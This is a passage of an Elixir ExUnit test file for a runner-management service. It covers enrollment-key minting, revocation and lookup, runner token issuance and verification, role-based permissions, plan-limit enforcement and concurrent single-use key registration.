      {_account, _user, subject} = account_with_owner_subject()
      %{subject: subject}
    end

    test "stores an auto_generated_at timestamp", %{subject: subject} do
      assert {:ok, raw, %EnrollmentKey{} = key} = Runners.mint_install_key(subject)
      assert String.starts_with?(raw, "emkey-enroll-")
      assert key.auto_generated_at != nil
      assert is_nil(key.last_used_at)
      assert EnrollmentKey.auto_unused?(key)
    end

    test "ring eviction caps the auto-unused set at the configured size", %{subject: subject} do
      # Tiny cap so the test runs fast. Bypass grace by making it 0 so
      # the eviction query trims the moment we exceed the cap.
      for _ <- 1..5 do
        {:ok, _, _} = Runners.mint_install_key(subject, ring_cap: 3, eviction_grace_seconds: 0)
      end

      assert Repo.aggregate(EnrollmentKey, :count) == 3
    end

    test "grace window protects fresh keys from eviction even past cap", %{subject: subject} do
      # cap=2, but grace=60s means a burst of 5 mints in the same
      # second all survive (none are older than the grace floor).
      for _ <- 1..5 do
        {:ok, _, _} = Runners.mint_install_key(subject, ring_cap: 2, eviction_grace_seconds: 60)
      end

      assert Repo.aggregate(EnrollmentKey, :count) == 5
    end

    test "does NOT touch other accounts' keys", %{subject: subject} do
      {_other, _other_user, other_subject} = account_with_owner_subject()

      {:ok, _, other_key} = Runners.mint_install_key(other_subject)

      # Saturate this account's ring.
      for _ <- 1..10 do
        {:ok, _, _} = Runners.mint_install_key(subject, ring_cap: 2, eviction_grace_seconds: 0)
      end

      # `other`'s key is untouched.
      assert EnrollmentKey.Query.all() |> EnrollmentKey.Query.by_id(other_key.id) |> Repo.peek() !=
               nil
    end

    test "a viewer (no issue_install_key) is refused" do
      account = Fixtures.Accounts.create_account()
      assert {:error, :unauthorized} = Runners.mint_install_key(viewer_subject_for(account))
    end
  end

  describe "revoke_enrollment_key/2" do
    setup do
      {account, _user, subject} = account_with_owner_subject()
      %{account: account, subject: subject}
    end

    test "stamps revoked_at; the key no longer resolves for registration", %{subject: subject} do
      {:ok, raw, key} = Runners.create_enrollment_key(%{reusable: true}, subject)

      assert {:ok, %EnrollmentKey{revoked_at: %DateTime{}}} =
               Runners.revoke_enrollment_key(key, subject)

      refute Runners.peek_enrollment_key_by_secret(raw)
    end

    test "revoking an already-revoked key is an idempotent no-op (preserves revoked_at)", %{
      subject: subject
    } do
      {:ok, _raw, key} = Runners.create_enrollment_key(%{reusable: true}, subject)
      {:ok, revoked} = Runners.revoke_enrollment_key(key, subject)

      # A second revoke returns the key without re-stamping a fresh timestamp.
      assert {:ok, %EnrollmentKey{} = again} = Runners.revoke_enrollment_key(revoked, subject)
      assert again.revoked_at == revoked.revoked_at
    end

    test "a viewer (no manage_enrollment_keys) is refused", %{account: account, subject: owner} do
      {:ok, _raw, key} = Runners.create_enrollment_key(%{reusable: true}, owner)

      assert {:error, :unauthorized} =
               Runners.revoke_enrollment_key(key, viewer_subject_for(account))
    end

    test "won't touch an enrollment key in another account (cross-account → :not_found)" do
      {_account_a, _ua, owner_a} = account_with_owner_subject()
      {_account_b, _ub, owner_b} = account_with_owner_subject()
      {:ok, _raw, key_a} = Runners.create_enrollment_key(%{reusable: true}, owner_a)

      assert {:error, :not_found} = Runners.revoke_enrollment_key(key_a, owner_b)
    end

    test "won't return an already-revoked enrollment key in another account" do
      {_account_a, _ua, owner_a} = account_with_owner_subject()
      {_account_b, _ub, owner_b} = account_with_owner_subject()
      {:ok, _raw, key_a} = Runners.create_enrollment_key(%{reusable: true}, owner_a)
      {:ok, revoked_key_a} = Runners.revoke_enrollment_key(key_a, owner_a)

      assert {:error, :not_found} = Runners.revoke_enrollment_key(revoked_key_a, owner_b)
    end
  end

  describe "peek_enrollment_key_by_secret/1" do
    setup do
      {_account, _user, subject} = account_with_owner_subject()
      %{subject: subject}
    end

    test "returns the key for a valid secret", %{subject: subject} do
      {:ok, raw, %EnrollmentKey{id: id}} =
        Runners.create_enrollment_key(%{reusable: true}, subject)

      assert %EnrollmentKey{id: ^id} = Runners.peek_enrollment_key_by_secret(raw)
    end

    test "returns nil for a revoked key", %{subject: subject} do
      {:ok, raw, key} = Runners.create_enrollment_key(%{reusable: true}, subject)
      {:ok, _} = Runners.revoke_enrollment_key(key, subject)

      refute Runners.peek_enrollment_key_by_secret(raw)
    end

    test "returns nil for an expired key", %{subject: subject} do
      past = DateTime.utc_now() |> DateTime.add(-3600, :second) |> DateTime.truncate(:microsecond)

      {:ok, raw, _key} =
        Runners.create_enrollment_key(%{reusable: true, expires_at: past}, subject)

      refute Runners.peek_enrollment_key_by_secret(raw)
    end

    test "returns nil for a single-use key after first use", %{subject: subject} do
      {:ok, raw, key} = Runners.create_enrollment_key(%{reusable: false}, subject)

      # First use bumps usage; second lookup should miss.
      assert %EnrollmentKey{id: id} = Runners.peek_enrollment_key_by_secret(raw)
      assert id == key.id

      {:ok, _} = key |> EnrollmentKey.Changeset.usage() |> Repo.update()
      refute Runners.peek_enrollment_key_by_secret(raw)
    end

    test "returns nil for garbage input" do
      refute Runners.peek_enrollment_key_by_secret("not-a-key")
      refute Runners.peek_enrollment_key_by_secret("")
    end

    test "round-trips a fixed seed-bootstrap raw secret" do
      account = Fixtures.Accounts.create_account()
      user = Fixtures.Users.create_user()
      raw = "emkey-enroll-dev-fixed-bootstrap-DO-NOT-USE-IN-PROD"

      key =
        Fixtures.Runners.create_enrollment_key_with_secret(raw, account.id, user.id, %{
          reusable: true
        })

      assert key.key_prefix == String.slice(raw, 0, 29)
      # Presenting the raw secret resolves to the same record — what makes the
      # docker-compose seeder + runner handoff work without an out-of-band copy.
      assert %EnrollmentKey{id: id} = Runners.peek_enrollment_key_by_secret(raw)
      assert id == key.id
    end
  end

  describe "mint_runner_token/3" do
    test "mints a prefixed raw token + persists its hash, bound to the runner" do
      runner = Fixtures.Runners.create_runner(connected?: false)

      assert {raw, %Token{} = token} = Runners.mint_runner_token(runner)
      assert String.starts_with?(raw, "rnrtok-")
      assert token.runner_id == runner.id
      assert is_binary(token.token_hash)
      # The minted raw token verifies back to this runner.
      assert {:ok, %Token{}, %Runner{id: id}} = Runners.verify_runner_token(raw)
      assert id == runner.id
    end

    test "records the issuing enrollment-key id when supplied" do
      account = Fixtures.Accounts.create_account()
      runner = Fixtures.Runners.create_runner(account_id: account.id, connected?: false)
      {_raw, key} = Fixtures.Runners.create_enrollment_key(account_id: account.id)

      assert {_raw, %Token{issued_via_key_id: key_id}} = Runners.mint_runner_token(runner, key.id)
      assert key_id == key.id
    end
  end

  describe "verify_runner_token/1" do
    test "returns {:ok, token, runner} for a valid raw token and bumps last_used_at" do
      runner = Fixtures.Runners.create_runner(connected?: false)
      {raw, token} = Runners.mint_runner_token(runner)

      assert {:ok, %Token{}, %Runner{id: id}} = Runners.verify_runner_token(raw)
      assert id == runner.id
      # `verify_runner_token` bumps last_used_at server-side; reload to observe.
      assert %Token{last_used_at: %DateTime{}} = Repo.reload!(token)
    end

    test "returns {:error, :token_invalid} for garbage" do
      assert {:error, :token_invalid} = Runners.verify_runner_token("rnrtok-garbage")
      assert {:error, :token_invalid} = Runners.verify_runner_token("")
    end

    test "returns {:error, :runner_disabled} only for a disabled runner's valid token" do
      {account, _user, subject} = account_with_owner_subject()
      runner = Fixtures.Runners.create_runner(account_id: account.id, connected?: false)
      {raw, _token} = Runners.mint_runner_token(runner)

      {:ok, disabled} = Runners.disable_runner(runner, subject)

      assert Runners.verify_runner_token(raw) == {:error, :runner_disabled}
      assert Runners.verify_runner_token(raw <> "forged") == {:error, :token_invalid}

      {:ok, _enabled} = Runners.enable_runner(disabled, subject)
      runner_id = runner.id
      assert {:ok, %Token{}, %Runner{id: ^runner_id}} = Runners.verify_runner_token(raw)
    end

    test "returns account_disabled without consuming the retained token" do
      {account, _user, subject} = account_with_owner_subject()
      runner = Fixtures.Runners.create_runner(account_id: account.id, connected?: false)
      {raw, _token} = Runners.mint_runner_token(runner)
      other_runner = Fixtures.Runners.create_runner(connected?: false)
      {other_raw, _other_token} = Runners.mint_runner_token(other_runner)

      assert {:ok, _account} =
               Emisar.Accounts.set_account_disabled_for_support(
                 account.id,
                 true,
                 "Temporary hold",
                 subject
               )

      assert Runners.verify_runner_token(raw) == {:error, :account_disabled}
      assert {:ok, %Token{}, %Runner{id: other_id}} = Runners.verify_runner_token(other_raw)
      assert other_id == other_runner.id

      assert {:ok, _account} =
               Emisar.Accounts.set_account_disabled_for_support(
                 account.id,
                 false,
                 "Hold resolved",
                 subject
               )

      assert {:ok, %Token{}, %Runner{id: runner_id}} = Runners.verify_runner_token(raw)
      assert runner_id == runner.id
    end

    test "a deleted account remains terminal rather than retryable" do
      account = Fixtures.Accounts.create_account()
      runner = Fixtures.Runners.create_runner(account_id: account.id, connected?: false)
      {raw, _token} = Runners.mint_runner_token(runner)
      Fixtures.Accounts.mark_account_as_deleted(account)

      assert Runners.verify_runner_token(raw) == {:error, :token_invalid}
    end

    test "returns {:error, :token_invalid} for a deleted runner's token" do
      {account, _user, subject} = account_with_owner_subject()
      runner = Fixtures.Runners.create_runner(account_id: account.id, connected?: false)
      {raw, _token} = Runners.mint_runner_token(runner)

      {:ok, _} = Runners.delete_runner(runner, subject)

      assert Runners.verify_runner_token(raw) == {:error, :token_invalid}
    end
  end

  describe "subject_can_view_runners?/1" do
    test "true for a viewer, false for a billing_manager (the nav gate)" do
      account = Fixtures.Accounts.create_account()

      viewer_subject =
        Fixtures.Subjects.subject_for(Fixtures.Users.create_user(), account, role: :viewer)

      billing_manager_subject =
        Fixtures.Subjects.subject_for(Fixtures.Users.create_user(), account,
          role: :billing_manager
        )

      assert Runners.subject_can_view_runners?(viewer_subject)
      refute Runners.subject_can_view_runners?(billing_manager_subject)
    end
  end

  describe "subject_can_manage_runners?/1" do
    test "true for an owner, false for a viewer" do
      {account, _user, owner} = account_with_owner_subject()

      assert Runners.subject_can_manage_runners?(owner)
      refute Runners.subject_can_manage_runners?(viewer_subject_for(account))
    end
  end

  describe "subject_can_install_runners?/1" do
    test "operators and above can mint an install key; viewers cannot" do
      account = Fixtures.Accounts.create_account()

      operator =
        Fixtures.Subjects.subject_for(Fixtures.Users.create_user(), account, role: :operator)

      viewer = Fixtures.Subjects.subject_for(Fixtures.Users.create_user(), account, role: :viewer)

      assert Runners.subject_can_install_runners?(operator)
      refute Runners.subject_can_install_runners?(viewer)
    end
  end

  describe "subject_can_manage_enrollment_keys?/1" do
    test "true for an owner, false for a viewer" do
      {account, _user, owner} = account_with_owner_subject()

      assert Runners.subject_can_manage_enrollment_keys?(owner)
      refute Runners.subject_can_manage_enrollment_keys?(viewer_subject_for(account))
    end
  end

  describe "subject_can_manage_inactive_retention?/1" do
    test "true for an owner, false for a viewer" do
      {account, _user, owner} = account_with_owner_subject()

      assert Runners.subject_can_manage_inactive_retention?(owner)
      refute Runners.subject_can_manage_inactive_retention?(viewer_subject_for(account))
    end

    test "false for an admin whose runner access is restricted" do
      {account, _user, _owner} = account_with_owner_subject()
      admin = Fixtures.Memberships.create_membership(account_id: account.id, role: "admin")
      admin_subject = Fixtures.Subjects.membership_subject(admin)

      assert Runners.subject_can_manage_inactive_retention?(admin_subject)

      {:ok, db_only} = RunnerAccess.restricted(["db"], [])
      Fixtures.Memberships.force_runner_access(admin, db_only)

      refute Runners.subject_can_manage_inactive_retention?(admin_subject)
    end
  end

  describe "register_via_enrollment_key/3" do
    test "mints an runner + token on success" do
      account = Fixtures.Accounts.create_account()
      user = Fixtures.Users.create_user()

      {raw, _key} =
        Fixtures.Runners.create_enrollment_key(
          account_id: account.id,
          created_by_id: user.id,
          reusable: true
        )

      assert {:ok, %Runner{} = runner, %Token{}, raw_token} =
               Runners.register_via_enrollment_key(raw, %{
                 hostname: "demo-1",
                 group: "demo",
                 external_id: "ext-#{System.unique_integer([:positive])}"
               })

      assert runner.account_id == account.id
      assert is_binary(raw_token)
      assert String.starts_with?(raw_token, "rnrtok-")
    end

    test "re-registration with the same external_id reuses the runner" do
      # Reconnect: the runner persists + presents a stable external_id, so
      # the same row is reused (and the version is refreshed). This is the
      # path that used to 500 on the (account_id, name) unique index.
      account = Fixtures.Accounts.create_account()
      user = Fixtures.Users.create_user()

      {raw, _key} =
        Fixtures.Runners.create_enrollment_key(
          account_id: account.id,
          created_by_id: user.id,
          reusable: true
        )

      attrs = %{
        hostname: "cs-429836741138",
        group: "cs-default",
        version: "0.3.1",
        external_id: "stable-ext-id-1"
      }

      assert {:ok, %Runner{id: id1, runner_version: "0.3.1"}, %Token{}, _} =
               Runners.register_via_enrollment_key(raw, attrs)

      assert {:ok, %Runner{id: id2}, %Token{}, _} =
               Runners.register_via_enrollment_key(raw, attrs)

      assert id1 == id2
    end

    test "an exhausted single-use key retries only its original runner identity" do
      account = Fixtures.Accounts.create_account()
      user = Fixtures.Users.create_user()

      {raw, key} =
        Fixtures.Runners.create_enrollment_key(
          account_id: account.id,
          created_by_id: user.id,
          reusable: false
        )

      attrs = %{hostname: "durable-host", group: "prod", external_id: "durable-ext-id"}

      assert {:ok, %Runner{id: runner_id}, %Token{id: first_token_id}, first_raw} =
               Runners.register_via_enrollment_key(raw, attrs)

      assert is_nil(Runners.peek_enrollment_key_by_secret(raw))

      assert {:ok, %Runner{id: ^runner_id}, %Token{id: second_token_id}, second_raw} =
               Runners.register_via_enrollment_key(raw, attrs)

      refute first_token_id == second_token_id
      refute first_raw == second_raw
      assert is_nil(Repo.get(Token, first_token_id))
      assert %Token{} = Repo.get(Token, second_token_id)
      assert Repo.reload!(key).uses_count == 1

      assert {:error, :enrollment_key_invalid} =
               Runners.register_via_enrollment_key(raw, %{attrs | external_id: "other-host"})

      assert Repo.aggregate(
               Runner.Query.by_account_id(Runner.Query.not_deleted(), account.id),
               :count
             ) == 1
    end

    test "revocation disables an exhausted-key retry for the bound identity" do
      {account, user, subject} = account_with_owner_subject()

      {raw, key} =
        Fixtures.Runners.create_enrollment_key(
          account_id: account.id,
          created_by_id: user.id,
          reusable: false
        )

      attrs = %{hostname: "revoked-host", group: "prod", external_id: "revoked-ext-id"}
      assert {:ok, %Runner{}, %Token{}, _} = Runners.register_via_enrollment_key(raw, attrs)
      assert {:ok, %EnrollmentKey{}} = Runners.revoke_enrollment_key(Repo.reload!(key), subject)

      assert {:error, :enrollment_key_invalid} =
               Runners.register_via_enrollment_key(raw, attrs)
    end

    test "re-registration after a soft-delete creates a fresh runner" do
      # The (account_id, external_id) unique index is partial
      # (WHERE deleted_at IS NULL), so a soft-deleted runner no longer
      # reserves its external_id: the same host re-registers as a brand-new
      # row instead of 500ing on the constraint / re-fetch mismatch.
      {account, user, subject} = account_with_owner_subject()

      {raw, _key} =
        Fixtures.Runners.create_enrollment_key(
          account_id: account.id,
          created_by_id: user.id,
          reusable: true
        )

      attrs = %{hostname: "host-x", group: "g", external_id: "recycled-ext-id"}

      assert {:ok, %Runner{id: id1} = runner1, %Token{}, _} =
               Runners.register_via_enrollment_key(raw, attrs)

      assert {:ok, %Runner{id: ^id1}} = Runners.delete_runner(runner1, subject)

      assert {:ok, %Runner{id: id2}, %Token{}, _} =
               Runners.register_via_enrollment_key(raw, attrs)

      refute id1 == id2
    end

    test "a CONNECTED holder keeps its name — a different external_id is rejected" do
      # Names are unique among live runners. An actively connected holder is
      # a real conflict: a different machine reusing the name gets a clean
      # error, never a silent takeover of a working runner.
      account = Fixtures.Accounts.create_account()
      user = Fixtures.Users.create_user()

      {raw, _key} =
        Fixtures.Runners.create_enrollment_key(
          account_id: account.id,
          created_by_id: user.id,
          reusable: true
        )

      base = %{hostname: "samehost", group: "g"}

      assert {:ok, %Runner{name: "samehost"} = holder, _, _} =
               Runners.register_via_enrollment_key(raw, Map.put(base, :external_id, "ext-a"))

      {:ok, _} = Runners.connect_runner(holder)

      assert {:error, :runner_name_taken, "samehost"} =
               Runners.register_via_enrollment_key(raw, Map.put(base, :external_id, "ext-b"))
    end

    test "an OFFLINE holder keeps the name — a conflict is a conflict" do
      # No displacement magic: a live row holding the name, connected or
      # not, conflicts. The operator renames or deletes the holder.
      account = Fixtures.Accounts.create_account()
      user = Fixtures.Users.create_user()

      {raw, _key} =
        Fixtures.Runners.create_enrollment_key(
          account_id: account.id,
          created_by_id: user.id,
          reusable: true
        )

      base = %{hostname: "samehost", group: "g"}

      assert {:ok, %Runner{id: holder_id, name: "samehost"}, _, _} =
               Runners.register_via_enrollment_key(raw, Map.put(base, :external_id, "ext-a"))

      assert {:error, :runner_name_taken, "samehost"} =
               Runners.register_via_enrollment_key(raw, Map.put(base, :external_id, "ext-b"))

      # The holder is untouched.
      assert %Runner{} = Runners.peek_runner_by_id(holder_id)
    end

    test "a taken name frees up once the holding runner is deleted" do
      {account, user, subject} = account_with_owner_subject()

      {raw, _key} =
        Fixtures.Runners.create_enrollment_key(
          account_id: account.id,
          created_by_id: user.id,
          reusable: true
        )

      base = %{hostname: "samehost", group: "g"}

      assert {:ok, %Runner{} = holder, _, _} =
               Runners.register_via_enrollment_key(raw, Map.put(base, :external_id, "ext-a"))

      # Connected holders are never displaced — the conflict stands.
      {:ok, holder} = Runners.connect_runner(holder)

      assert {:error, :runner_name_taken, "samehost"} =
               Runners.register_via_enrollment_key(raw, Map.put(base, :external_id, "ext-b"))

      # Deleting the holder soft-deletes it, freeing the name (partial index).
      {:ok, _} = Runners.delete_runner(holder, subject)

      assert {:ok, %Runner{name: "samehost"}, _, _} =
               Runners.register_via_enrollment_key(raw, Map.put(base, :external_id, "ext-b"))
    end

    test "rejects an invalid external_id before consuming the enrollment key" do
      account = Fixtures.Accounts.create_account()
      user = Fixtures.Users.create_user()

      {raw, _key} =
        Fixtures.Runners.create_enrollment_key(
          account_id: account.id,
          created_by_id: user.id,
          reusable: true
        )

      for external_id <- [nil, "", "  ", String.duplicate("x", 256)] do
        attrs = %{hostname: "invalid-id-host", group: "g", external_id: external_id}
        assert {:error, :invalid_external_id} = Runners.register_via_enrollment_key(raw, attrs)
      end

      valid = %{hostname: "valid-id-host", group: "g", external_id: "durable-id"}

      assert {:ok, %Runner{external_id: "durable-id"}, _, _} =
               Runners.register_via_enrollment_key(raw, valid)
    end

    test "returns :over_limit when the plan cap is exceeded" do
      # `free` plan caps runners at 3.
      account = Fixtures.Accounts.create_account(plan: "free")
      user = Fixtures.Users.create_user()

      _ = Fixtures.Runners.create_runner(account_id: account.id)
      _ = Fixtures.Runners.create_runner(account_id: account.id)
      _ = Fixtures.Runners.create_runner(account_id: account.id)

      {raw, _key} =
        Fixtures.Runners.create_enrollment_key(
          account_id: account.id,
          created_by_id: user.id,
          reusable: true
        )

      assert {:error, :over_limit, "free", 3} =
               Runners.register_via_enrollment_key(raw, %{
                 external_id: "ext-over-limit",
                 group: "demo"
               })
    end

    test "a reconnecting runner at the plan cap still registers (its seat is already counted)" do
      # `free` caps runners at 3. Fill the account to the cap, with one runner
      # registered via a stable external_id so we can reconnect it.
      account = Fixtures.Accounts.create_account(plan: "free")
      user = Fixtures.Users.create_user()

      {raw, _key} =
        Fixtures.Runners.create_enrollment_key(
          account_id: account.id,
          created_by_id: user.id,
          reusable: true
        )

      assert {:ok, %Runner{}, _, _} =
               Runners.register_via_enrollment_key(raw, %{external_id: "ext-keep", group: "g"})

      _ = Fixtures.Runners.create_runner(account_id: account.id)
      _ = Fixtures.Runners.create_runner(account_id: account.id)

      # Now at 3/3. Re-registering the SAME runner (e.g. it lost its token on a
      # redeploy) must NOT be blocked by its own seat — regression for the
      # limit check running before the reconnect-vs-fresh decision.
      assert {:ok, %Runner{}, _, _} =
               Runners.register_via_enrollment_key(raw, %{external_id: "ext-keep", group: "g"})

      # ...but a genuinely NEW runner at the cap is still refused.
      assert {:error, :over_limit, "free", 3} =
               Runners.register_via_enrollment_key(raw, %{external_id: "ext-new", group: "g"})
    end

    test "returns :enrollment_key_invalid for an unknown raw secret" do
      assert {:error, :enrollment_key_invalid} =
               Runners.register_via_enrollment_key("emkey-enroll-garbage", %{})
    end

    test "threads the request context onto the runner.registered audit row" do
      account = Fixtures.Accounts.create_account()
      user = Fixtures.Users.create_user()
      {_owner_user, _acct, subject} = {user, account, owner_subject_for(account, user)}

      {raw, _key} =
        Fixtures.Runners.create_enrollment_key(
          account_id: account.id,
          created_by_id: user.id,
          reusable: true
        )

      context = %RequestContext{ip_address: "203.0.113.7"}

      assert {:ok, %Runner{}, _, _} =
               Runners.register_via_enrollment_key(
                 raw,
                 %{hostname: "ctx-host", group: "g", external_id: "ext-ctx"},
                 context
               )

      events = Audit.list_events(subject, page: [limit: 20]) |> elem(1)
      registered = Enum.find(events, &(&1.event_type == "runner.registered"))
      assert registered != nil
      assert registered.ip_address == "203.0.113.7"
    end

    test "single-use key under concurrent attempts: exactly one succeeds" do
      # Guards against the race the atomic-claim defends against: two
      # callers both observe `uses_count = 0` and both try to register.
      # With the old serial "select then update" implementation, both
      # succeeded and we ended up with two runners minted from a single
      # single-use key.
      #
      # `Task.async` inherits the sandbox connection via `$callers`,
      # so the parallel registrations all see the same DB state under
      # async: true. No explicit `Sandbox.allow` needed.
      account = Fixtures.Accounts.create_account()
      user = Fixtures.Users.create_user()

      {raw, _key} =
        Fixtures.Runners.create_enrollment_key(
          account_id: account.id,
          created_by_id: user.id,
          reusable: false
        )

      results =
        1..8
        |> Enum.map(fn i ->
          Task.async(fn ->
            Runners.register_via_enrollment_key(raw, %{
              hostname: "demo-#{i}",
              group: "demo",
              # Distinct external_ids so a stray double-success would
              # produce two distinct runner rows, surfacing the bug
              # rather than silently merging.
              external_id: "ext-#{i}-#{System.unique_integer([:positive])}"
            })
          end)
        end)
        |> Enum.map(&Task.await(&1, 5_000))

      successes = Enum.count(results, &match?({:ok, _, _, _}, &1))
      failures = Enum.count(results, &match?({:error, :enrollment_key_invalid}, &1))

      assert successes == 1, "expected exactly 1 success, got #{successes}: #{inspect(results)}"
      assert failures == 7, "expected 7 :enrollment_key_invalid failures, got #{failures}"
    end

    test "promotes an auto-generated install key to permanent on first use" do
      {_account, _user, subject} = account_with_owner_subject()
      {:ok, raw, key} = Runners.mint_install_key(subject)
      assert EnrollmentKey.auto_unused?(key)

      assert {:ok, %Runner{}, _, _} =
               Runners.register_via_enrollment_key(raw, %{
                 hostname: "demo-1",
                 group: "demo",
                 external_id: "ext-#{System.unique_integer([:positive])}"
               })

      # auto_generated_at cleared, last_used_at set, key now visible.
      reloaded =
        EnrollmentKey.Query.all()
        |> EnrollmentKey.Query.by_id(key.id)
        |> Repo.fetch!(EnrollmentKey.Query)

      assert is_nil(reloaded.auto_generated_at)
      assert reloaded.last_used_at != nil
      assert {:ok, [%EnrollmentKey{id: id}], _} = Runners.list_enrollment_keys(subject)
      assert id == key.id
    end

    test "emits an enrollment_key.bound audit event with auto: true on auto-key bind" do
      {_account, _user, subject} = account_with_owner_subject()
      {:ok, raw, _key} = Runners.mint_install_key(subject)

      {:ok, _runner, _token, _raw_token} =
        Runners.register_via_enrollment_key(raw, %{
          hostname: "demo",
          group: "demo",
          external_id: "ext-#{System.unique_integer([:positive])}"
        })

      events = Audit.list_events(subject, page: [limit: 50]) |> elem(1)
      bound = Enum.find(events, &(&1.event_type == "enrollment_key.bound"))
      assert bound != nil
      assert bound.payload["auto"] == true
    end
  end

  # The plan-limit + billing-seat behavior that register/disable/enable lean on
  # — Billing owns check_limit, but these prove the Runners write paths honor it.
  describe "plan-limit runner count (Billing.check_limit/2)" do
    setup do
      {account, _user, subject} = account_with_owner_subject()
      %{account: account, subject: subject}
    end

    test "deleted runners don't count toward the limit", %{account: account, subject: subject} do
      r1 = Fixtures.Runners.create_runner(account_id: account.id, connected?: false)
      Fixtures.Runners.create_runner(account_id: account.id, connected?: false)
      Fixtures.Runners.create_runner(account_id: account.id, connected?: false)

      assert {:error, :over_limit, "free", 3} = Billing.check_limit(account, :runners)

      {:ok, _} = Runners.delete_runner(r1, subject)

      assert :ok = Billing.check_limit(account, :runners)
      assert {:ok, %{runner_count: 2}} = Billing.billing_summary(account, subject)
    end

    test "disabled runners don't count toward the limit", %{account: account, subject: subject} do
      r1 = Fixtures.Runners.create_runner(account_id: account.id, connected?: false)
      Fixtures.Runners.create_runner(account_id: account.id, connected?: false)
      Fixtures.Runners.create_runner(account_id: account.id, connected?: false)

      assert {:error, :over_limit, "free", 3} = Billing.check_limit(account, :runners)

      {:ok, _} = Runners.disable_runner(r1, subject)
      assert :ok = Billing.check_limit(account, :runners)
    end

    test "a past_due account keeps full plan limits — status never gates registration" do
      # account_plan/1 is status-agnostic, so a Team account whose subscription
      # lapsed to past_due still resolves to the Team cap (100) and registers a
      # runner under it. Billing status is advisory (banners), never an entitlement
      # gate — register_via_enrollment_key only blocks on the runner cap.
      account = Fixtures.Accounts.create_account()
      Fixtures.Accounts.create_subscription(account, "team", status: "past_due")
      user = Fixtures.Users.create_user()

      assert Billing.account_plan(account) == "team"
      # Two runners on a Team plan is well under the cap → check_limit is :ok.
      _ = Fixtures.Runners.create_runner(account_id: account.id)
      _ = Fixtures.Runners.create_runner(account_id: account.id)
      assert :ok = Billing.check_limit(account, :runners)

      {raw, _key} =
        Fixtures.Runners.create_enrollment_key(
          account_id: account.id,
          created_by_id: user.id,
          reusable: true
        )

      assert {:ok, %Runner{}, _, _} =
               Runners.register_via_enrollment_key(raw, %{external_id: "ext-pastdue", group: "g"})
    end
  end

  describe "Authorizer.for_subject runner-scoping" do
    test "a runner subject sees only its own runner row, not its account peers" do
      account = Fixtures.Accounts.create_account()
      runner = Fixtures.Runners.create_runner(account_id: account.id)
      _peer = Fixtures.Runners.create_runner(account_id: account.id)

      runner_subject = Subject.for_runner(runner, account)

      ids =
        Runner.Query.all()
        |> Runners.Authorizer.for_subject(runner_subject)
        |> Repo.all()
        |> Enum.map(& &1.id)

      # Cross-runner visibility within an account is intentionally impossible.
      assert ids == [runner.id]
    end

    test "an account-less / actor-less subject gets zero rows (fail-closed fallback)" do
      account = Fixtures.Accounts.create_account()
      Fixtures.Runners.create_runner(account_id: account.id)
      bare_subject = Fixtures.Subjects.build_subject()

      rows =
        Runner.Query.all()
        |> Runners.Authorizer.for_subject(bare_subject)
        |> Repo.all()

      assert rows == []
    end

    test "account-scoped runner token queries exclude deleted runners" do
      {account, _user, subject} = account_with_owner_subject()
      runner = Fixtures.Runners.create_runner(account_id: account.id, connected?: false)
      {_raw, token} = Runners.mint_runner_token(runner)
      {:ok, _deleted} = Runners.delete_runner(runner, subject)

      assert [] =
               Token.Query.all()
               |> Runners.Authorizer.for_subject(subject)
               |> Repo.all()

      assert %Token{id: id} = Repo.reload!(token)
      assert id == token.id
    end
  end

  # Stamp a runner's durable connection-record columns directly — `register/0`
  # leaves a fresh runner never-connected, so the connection-state tests set them.
  defp put_connection(runner, fields),
    do: runner |> Ecto.Changeset.change(fields) |> Repo.update!()

  defp viewer_subject_for(account) do
    viewer = Fixtures.Users.create_user()

    _ =
      Fixtures.Memberships.create_membership(
        account_id: account.id,
        user_id: viewer.id,
        role: "viewer"
      )

    Fixtures.Subjects.subject_for(viewer, account, role: :viewer)
  end

  defp owner_subject_for(account, user) do
    _ =
      Fixtures.Memberships.create_membership(
        account_id: account.id,
        user_id: user.id,
        role: "owner"
      )

    Fixtures.Subjects.subject_for(user, account, role: :owner)
  end
end
